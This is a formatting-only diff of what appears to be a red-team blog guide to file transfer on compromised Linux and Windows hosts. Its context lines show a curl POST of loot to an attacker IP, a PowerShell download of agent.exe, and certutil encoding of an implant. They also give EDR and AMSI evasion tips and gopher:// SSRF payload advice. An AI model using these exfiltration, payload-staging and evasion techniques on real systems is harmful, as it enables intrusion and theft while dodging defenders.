@@ -15,7 +15,10 @@ readTime: "15 mins"
 Moving tools, loot, and implants between machines is one of the most repetitive — and most detection-prone — activities on an engagement. A clean file transfer is often the difference between a quiet beachhead and a tripped EDR. This guide catalogues the techniques I reach for across Linux, Windows, restricted shells, and inspected networks, with an emphasis on **living off the land**, **OPSEC**, and **fallback chains** when your first option gets blocked.
 
 <Callout type="warning" title="OPSEC First">
-  Every technique here leaves artifacts: process logs, Sysmon EID 1/3/11, proxy logs, TLS JA3 hashes, SMB share mounts. Always assume the defender is logging. Prefer native binaries, encode when you must, and rotate methods when a transfer fails — a single failed `certutil` will often trip your first EDR rule.
+  Every technique here leaves artifacts: process logs, Sysmon EID 1/3/11, proxy logs, TLS JA3
+  hashes, SMB share mounts. Always assume the defender is logging. Prefer native binaries, encode
+  when you must, and rotate methods when a transfer fails — a single failed `certutil` will often
+  trip your first EDR rule.
 </Callout>
 
 <Callout type="note" title="IP Address Convention">
@@ -24,7 +27,8 @@ Moving tools, loot, and implants between machines is one of the most repetitive 
   - **`10.10.10.23`** → The **victim / target** machine
   - **`10.10.20.x`** → **Internal network** hosts (reachable only through the victim)
 
-  Each code block that involves two or more machines includes a comment at the top reminding you which IP is which.
+Each code block that involves two or more machines includes a comment at the top reminding you which IP is which.
+
 </Callout>
 
 ## Linux-Based Transfers
@@ -61,7 +65,9 @@ curl -X POST http://10.10.14.5/loot \
 ```
 
 <Callout type="info">
-`curl` supports `file://`, `gopher://`, and `dict://` out of the box. In SSRF chains these protocols are gold — `gopher://` in particular lets you craft arbitrary TCP payloads against internal services (Redis, Memcached, internal SMTP).
+  `curl` supports `file://`, `gopher://`, and `dict://` out of the box. In SSRF chains these
+  protocols are gold — `gopher://` in particular lets you craft arbitrary TCP payloads against
+  internal services (Redis, Memcached, internal SMTP).
 </Callout>
 
 ### wget
@@ -142,14 +148,14 @@ rsync -avz --exclude='*.log' --exclude='/proc/*' --exclude='/sys/*' \
 rsync -avz -e "ssh -p 2222" ./toolkit victim@10.10.10.23:/tmp/toolkit
 ```
 
-| Flag | Purpose |
-| --- | --- |
-| `-a` | archive mode (recursive, preserve perms/owner/symlinks) |
-| `-v` | verbose |
-| `-z` | compress during transfer |
-| `--partial` | keep half-transferred files for resume |
+| Flag        | Purpose                                                 |
+| ----------- | ------------------------------------------------------- |
+| `-a`        | archive mode (recursive, preserve perms/owner/symlinks) |
+| `-v`        | verbose                                                 |
+| `-z`        | compress during transfer                                |
+| `--partial` | keep half-transferred files for resume                  |
 | `--inplace` | update the destination file in-place (no temp + rename) |
-| `-e` | specify the remote shell, including custom SSH flags |
+| `-e`        | specify the remote shell, including custom SSH flags    |
 
 ### netcat and socat
 
@@ -219,11 +225,11 @@ certutil.exe -encode C:\Tools\implant.exe C:\Tools\implant.b64
 ```
 
 <Callout type="warning" title="AV/EDR Detection — Read This">
-  `certutil -urlcache -f` is one of the most heavily signatured LotL patterns in existence. Defender for Endpoint, CrowdStrike, and SentinelOne all flag it by default. If you must use it:
-  - Strip the `.exe` from your URL (e.g. `/agent.jpg`)
-  - Use a redirector with a legitimate-looking `User-Agent` (certutil sends `Microsoft-CryptoAPI/10.0`)
-  - Prefer `-decode` of a staged base64 blob over the direct URL fetch
-  - **Avoid entirely on EDR'd hosts.** Move to PowerShell `Net.WebClient` or SMB.
+  `certutil -urlcache -f` is one of the most heavily signatured LotL patterns in existence. Defender
+  for Endpoint, CrowdStrike, and SentinelOne all flag it by default. If you must use it: - Strip the
+  `.exe` from your URL (e.g. `/agent.jpg`) - Use a redirector with a legitimate-looking `User-Agent`
+  (certutil sends `Microsoft-CryptoAPI/10.0`) - Prefer `-decode` of a staged base64 blob over the
+  direct URL fetch - **Avoid entirely on EDR'd hosts.** Move to PowerShell `Net.WebClient` or SMB.
 </Callout>
 
 ### bitsadmin
@@ -250,7 +256,9 @@ bitsadmin /complete myjob
 ```
 
 <Callout type="info">
-  BITS is asynchronous — `bitsadmin /transfer` blocks, but `/create` + `/addfile` + `/resume` returns immediately. Use `/info` or `/getstate` to poll, and remember to call `/complete` or the job lingers in the queue (defender-visible via `Get-BitsTransfer`).
+  BITS is asynchronous — `bitsadmin /transfer` blocks, but `/create` + `/addfile` + `/resume`
+  returns immediately. Use `/info` or `/getstate` to poll, and remember to call `/complete` or the
+  job lingers in the queue (defender-visible via `Get-BitsTransfer`).
 </Callout>
 
 ### PowerShell
@@ -314,7 +322,9 @@ $wc.DownloadFile('http://10.10.14.5/agent.exe', 'agent.exe')
 ```
 
 <Callout type="warning" title="AMSI and Script Block Logging">
-  Both `IEX` and `DownloadString` feed content through AMSI before execution. On a fully-instrumented host, an unobfuscated Mimikatz download will be caught within milliseconds. If AMSI bypass isn't viable, prefer `DownloadFile` to disk + a separately-staged loader.
+  Both `IEX` and `DownloadString` feed content through AMSI before execution. On a
+  fully-instrumented host, an unobfuscated Mimikatz download will be caught within milliseconds. If
+  AMSI bypass isn't viable, prefer `DownloadFile` to disk + a separately-staged loader.
 </Callout>
 
 ### SMB File Transfers (Impacket's `smbserver.py`)
@@ -376,7 +386,9 @@ python -m SimpleHTTPServer 8000
 ```
 
 <Callout type="warning" title="Fingerprintable">
-  The default `http.server` module sends a `Server: SimpleHTTP/0.6 Python/3.x` header and `Content-Type` guesses that are immediately recognizable in proxy logs. Defenders pivot on this header. If you need stealth, write a 20-line Flask/FastAPI server or proxy through nginx.
+  The default `http.server` module sends a `Server: SimpleHTTP/0.6 Python/3.x` header and
+  `Content-Type` guesses that are immediately recognizable in proxy logs. Defenders pivot on this
+  header. If you need stealth, write a 20-line Flask/FastAPI server or proxy through nginx.
 </Callout>
 
 ### PHP
@@ -609,5 +621,7 @@ A few habits that have saved me more than once:
 - **Clean up.** `net use /delete`, `bitsadmin /complete`, kill the `http.server` process, delete staged `.b64` blobs. Persistence is great; sloppiness is not.
 
 <Callout type="note" title="Final Word">
-  File transfer is infrastructure. The technique you pick matters less than the discipline of picking the right one for the environment you're in — and being ready to switch the moment the network pushes back.
+  File transfer is infrastructure. The technique you pick matters less than the discipline of
+  picking the right one for the environment you're in — and being ready to switch the moment the
+  network pushes back.
 </Callout>
